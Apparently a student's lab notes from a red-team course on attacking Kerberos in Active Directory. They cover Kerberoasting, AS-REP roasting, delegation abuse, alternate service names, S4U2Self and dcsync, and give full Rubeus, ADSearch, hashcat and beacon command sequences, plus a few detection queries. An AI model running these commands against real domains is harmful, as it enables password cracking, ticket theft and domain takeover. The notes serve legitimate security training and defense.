# Kerberos

When a user logs onto their workstation it sends an AS-REQ to the Key Distribution Center (KDC)/Domain Controller (DC), requesting a TGT using a secret key derived from the user's password. KDC verifies the secret key with the password it has stored in Active Directory for that user. If valid it returns the TGT. The TGT contains the user's identity and is encrypted with the KDC secret key (the krbtgt account). When the user attempts to access a resource using Kerberos (e.g. a file share), the client looks up the associated Service Principal Name (SPN), and requests a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're valid. The KDC returns a TGS for the service, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access.

| Client | | KDC | | Server |
|:--:|:--:|:--:|:--:|:--:|
| Request TGT (AS-REQ) | -> | • | | |
| • | <- | Return TGT (AS-REP) |  |  |
| Request TGS for service (TGS-REQ) | -> | • | | |
| • | <- | Return TGs (TGS-REP) |  |  |
| Present TGS to service | -> | -> | -> | • |
| • | <- | <- | <- | Grant access |

## Kerberoasting

Services run on a machine under the context of a user account; local (LocalSystem, LocalService, NetworkService) or domain accounts (e.g. DOMAIN\mssql). A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD (e.g. MSSQLSvc.sql-2.dev.corp.io:1433 in the service's properties).

Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. Kerberoasting requests TGSs for services running under the context of domain accounts and cracks them offline to reveal their plaintext passwords. Rubeus Kerberoast can be used to perform the kerberoasting. Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt). 

```beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap``` returns long hashes which can be cracked offline to recover the plaintext passwords for the accounts. Use:

* ```john --format=krb5tgs --wordlist=wordlist hashes``` or
* ```hashcat -a 0 -m 13100 hashes wordlist```

...but some hash format incompatibility with john. Remove the SPN from: 

    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc...

to: 

    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io...


But, honeypot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted. Since these events will never be generated for this service, it provides a high-fidelity indication of this attack: ```event.code: 4769 and winlog.event_data.ServiceName: honey_svc```. Safer to enumerate candidate users first and roast them selectively. This LDAP query will find domain users who have an SPN set: 

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

Then roast an individual account: ```execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap```

## ASREP Roasting

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline for the plaintext password. This is enabled on the User Object, often seen on Linux accounts. 

Of course don't asreproast every account in the domain: 

    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

Use:

* ```john --format=krb5asrep --wordlist=wordlist squid_svc``` or
* ```hashcat -a 0 -m 18200 squid_svc wordlist```

Catch: ASREPRoasting generates a 4768 event with RC4 encryption and a preauth type of 0:

    event.code: 4768 and winlog.event_data.PreAuthType: 0
    winlog.event_data.TicketEncryptionType: 0x17


## Unconstrained Delegation

Delegation allows a user or machine to act on behalf of another user to another service (e.g. user authenticates to a front-end web app that serves a back-end database -- the app authenticates to the DB using Kerberos as the authenticated user). When set up, unconstrained delegation makes KDC include the user's TGT inside the TGS. In this example, when the user accesses the Web Server, it caches the user's TGT. When the Web Server needs to access the DB Server on behalf of that user, it uses the TGT to request a TGS for the database service. It will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached and can be extracted memory for nefarious use against other services in the domain.

To return all computers that are permitted for unconstrained delegation: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname```

Domain Controllers are always permitted for unconstrained delegation.

If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as dir \\web\c$ is enough. Rubeus triage will show all the tickets that are currently cached. TGTs can be identified by the krbtgt service.

    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Extract this TGT and leverage it via a new logon session:

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
    beacon> steal_token 1540
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

For the lab: A task running on Workstation 1 as nlamb interacts with WEB$ every 5 minutes. If the ticket is not there, wait and try again.

Can also get a TGT for accounts by forcing them to authenticate remotely to the machine. (See the NTLM Relaying module in  Pivoting for tools for this.) This time, force the domain controller to authenticate to the web server to steal its TGT. Also use Rubeus' monitor command, which continuously monitors for and extract new TGTs as they get cached. It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

then run SharpSpoolTrigger:

    beacon> execute-assembly SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

Where:

  * DC-2 is the target
  * WEB is the listener

Rubeus will then capture the ticket. To stop Rubeus, use the jobs and jobkill commands.

Machine TGTs are leveraged slightly differently -- see S4U2Self Abuse later.  

## Constrained Delegation

Constrained delegation is a safer means for services to perform Kerberos delegation. It aims to restrict the services to which the server can act on behalf of a user. The server cannot cache the TGTs of other users, but can request a TGS for another user with its own TGT. Search for both user accounts as well as computer accounts doing this.

For example: SQL-2 can act on behalf of any user to the cifs service on DC-2 (CIFS allows you to list file shares and transfer files). To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json```

1: To perform the delegation, get the TGT of the trusted principal; extract it with Rubeus dump:

    beacon> run hostname
    beacon> getuid
    beacon> execute-assembly Rubeus.exe triage
    beacon> execute-assembly Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

2: With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2. Want someone who is local admin on the target or a domain admin. This will perform an S4U2Self first and then an S4U2Proxy:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:<user> /msdsspn:<service> user:<delegation> ticket:<user ticket> /nowrap

e.g.:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io user:sql-2$ /ticket:doIFLD... /nowrap

3: Use the final S4U2Proxy ticket for a new logon session, e.g.:

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGa...
    beacon> steal_token 5540
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

Rubeus asktgt also works if have NTLM or AES hashes.

Always use the FQDN. Otherwise, there will be 1326 errors:

    beacon> ls \\dc-2\c$
    [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE

## Alternate Service Name

The CIFS service is good for grabbing files, but if port 445 is blocked or for lateral movement, can abuse the alt svc name feature (confirmed as "by design" by Microsoft).

In the Kerberos authentication protocol, a service validates an inbound ticket by checking that service's symmetric key. This key is derived from the password hash of the principal running the service. Most services run in the SYSTEM context of a computer account, e.g. SQL-2$. Therefore, all service tickets will be encrypted with the same key. The SPN does not factor into ticket validation. The SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily. So we can request a service ticket for a service but then modify the SPN to a different service and the target service will accept it.

Use /altservice in Rubeus. This example uses the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io altservice:ldap /user:sql-2$ /ticket:doIFpD... /nowrap
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV username:nlamb /password:FakePass /ticket:doIGaD...
    beacon> steal_token 2580

LDAP service allows performing dcsync against a domain controller:

    beacon> dcsync dev.cyberbotic.io DEV\krbtgt

## S4U2Self Abuse

As above, there are two S4U (Service for User) extensions:

* S4U2Self (Service for User to Self) - service obtains a TGS to itself on behalf of a user
* S4U2Proxy (Service for User to Proxy) - service obtains a TGS on behalf of a user to a second service

In abusing constrained delegation above, Rubeus first builds an S4U2Self request and obtains a TGS for nlamb to sql-2/dev.cyberbotic.io; then builds an S4U2Proxy request to obtain a TGS for nlamb to cifs/dc-2.dev.cyberbotic.io. This is working by design because SQL-2 is specifically trusted for delegation to that service.

Another way to abuse the S4U2Self extension is to gain access to a computer with its TGT. In the Unconstrained Delegation module, we obtained a TGT for the domain controller. Passing that to a logon session and accessing the C$ share would fail. 

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj...
    beacon> steal_token 2832
    beacon> ls \\dc-2.dev.cyberbotic.io\c$
    [-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

Machines do not get remote local admin access to themselves. Instead abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin). Rubeus has a /self flag for this:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj... /nowrap
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD...
    beacon> steal_token 2664
    beacon> ls \\dc-2.dev.cyberbotic.io\c$


    

